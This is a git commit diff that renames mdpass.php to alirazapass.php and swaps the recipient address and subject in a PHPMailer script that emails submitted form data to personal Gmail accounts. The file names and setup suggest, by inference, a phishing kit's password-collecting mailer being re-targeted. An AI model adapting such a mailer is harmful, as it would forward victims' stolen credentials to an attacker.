b7bbc4fbe761be22633174c9b271cf69161fcfc4
kameronjustine234 <kameronjustine234@gmail.com>
2025-07-16 13:22:15 +0500

    Update and rename mdpass.php to alirazapass.php

--- alirazapass.php
+++ alirazapass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('aliumair0044@gmail.com', 'Pk');
         $mail->addAddress('aliumair0044@gmail.com');
-        $mail->addAddress('adsmenigar@gmail.com');
+        $mail->addAddress('alirazanizamani1010@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Muhammad';
+        $mail->Subject = 'Ali Raza';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
